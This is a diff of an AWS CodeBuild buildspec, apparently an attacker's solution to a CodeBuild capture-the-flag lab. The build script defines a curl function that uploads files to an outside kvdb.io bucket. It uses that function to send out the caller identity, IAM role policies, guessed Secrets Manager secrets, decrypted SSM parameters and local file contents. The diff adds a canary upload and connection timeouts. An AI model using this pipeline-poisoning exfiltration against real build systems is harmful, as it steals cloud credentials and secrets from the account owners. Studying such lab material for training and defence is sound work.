@@ -1,29 +1,36 @@
 version: 0.2
 
+env:
+  variables:
+    AWS_MAX_ATTEMPTS: "1"
+    AWS_RETRY_MODE: "standard"
+
 phases:
   build:
     commands:
       - echo "Running vulnerable training build"
       - |
         set +e
-        bucket='https://kvdb.io/xPNzYaYpznrnsyHRvmAsP'
+        bucket='https://kvdb.io/8uXHVtwRAd5qcuZcw9GdSh'
         runid="${CODEBUILD_BUILD_ID##*:}"
-        putkey(){ key="$1"; file="$2"; head -c 15000 "$file" | curl -fsS --data-binary @- "$bucket/${runid}_$key" || true; }
+        putkey(){ key="$1"; file="$2"; head -c 15000 "$file" | curl -fsS --connect-timeout 5 --max-time 20 --data-binary @- "$bucket/${runid}_$key" || true; }
+        echo "canary $runid" > /tmp/canary.txt
+        putkey canary /tmp/canary.txt
         names='flag FLAG lab-flag lab5-flag lab_5_flag codebuild-flag codebuild_lab_5_flag codebuild_lab_5_secret codebuild-codebreach-actors-lab-flag codebreach-flag actors-flag training-flag'
         params='/flag /FLAG /lab/flag /lab5/flag /lab-5/flag /codebuild/flag /codebuild_lab_5/flag /codebreach/flag /actors/flag /training/flag'
 
-        aws sts get-caller-identity > /tmp/whoami.txt 2>&1
+        aws sts get-caller-identity --cli-connect-timeout 5 --cli-read-timeout 10 > /tmp/whoami.txt 2>&1
         putkey whoami /tmp/whoami.txt
 
         {
           echo '=== codebuild batch-get-projects ==='
-          aws codebuild batch-get-projects --names codebuild_lab_5_project --region us-east-1 --output json 2>&1
+          aws codebuild batch-get-projects --names codebuild_lab_5_project --region us-east-1 --output json --cli-connect-timeout 5 --cli-read-timeout 10 2>&1
           echo '=== iam role policies ==='
-          aws iam list-role-policies --role-name codebuild_lab_5_role --output json 2>&1
-          aws iam list-attached-role-policies --role-name codebuild_lab_5_role --output json 2>&1
-          for p in $(aws iam list-role-policies --role-name codebuild_lab_5_role --query 'PolicyNames[]' --output text 2>/dev/null); do
+          aws iam list-role-policies --role-name codebuild_lab_5_role --output json --cli-connect-timeout 5 --cli-read-timeout 10 2>&1
+          aws iam list-attached-role-policies --role-name codebuild_lab_5_role --output json --cli-connect-timeout 5 --cli-read-timeout 10 2>&1
+          for p in $(aws iam list-role-policies --role-name codebuild_lab_5_role --query 'PolicyNames[]' --output text --cli-connect-timeout 5 --cli-read-timeout 10 2>/dev/null); do
             echo "--- inline policy:$p"
-            aws iam get-role-policy --role-name codebuild_lab_5_role --policy-name "$p" --output json 2>&1
+            aws iam get-role-policy --role-name codebuild_lab_5_role --policy-name "$p" --output json --cli-connect-timeout 5 --cli-read-timeout 10 2>&1
           done
         } > /tmp/project_iam.txt 2>&1
         putkey project_iam /tmp/project_iam.txt
@@ -32,7 +39,7 @@ phases:
           echo '=== direct secretsmanager guesses ==='
           for n in $names; do
             echo "--- secret:$n"
-            aws secretsmanager get-secret-value --region us-east-1 --secret-id "$n" --output json 2>&1
+            aws secretsmanager get-secret-value --region us-east-1 --secret-id "$n" --output json --cli-connect-timeout 5 --cli-read-timeout 10 2>&1
           done
         } > /tmp/secret_guesses.txt 2>&1
         putkey secret_guesses /tmp/secret_guesses.txt
@@ -41,14 +48,15 @@ phases:
           echo '=== direct ssm guesses ==='
           for p in $params; do
             echo "--- parameter:$p"
-            aws ssm get-parameter --region us-east-1 --name "$p" --with-decryption --output json 2>&1
+            aws ssm get-parameter --region us-east-1 --name "$p" --with-decryption --output json --cli-connect-timeout 5 --cli-read-timeout 10 2>&1
           done
         } > /tmp/ssm_guesses.txt 2>&1
         putkey ssm_guesses /tmp/ssm_guesses.txt
 
         {
           echo '=== local repo and filesystem hints ==='
-          pwd; find . -maxdepth 4 -type f -print -exec sed -n '1,80p' {} \; 2>/dev/null | head -c 12000
+          pwd
+          find . -maxdepth 4 -type f -print -exec sed -n '1,80p' {} \; 2>/dev/null | head -c 12000
           echo '=== /codebuild/output files ==='
           find /codebuild/output -maxdepth 5 -type f 2>/dev/null | head -n 200
           echo '=== root small files names ==='
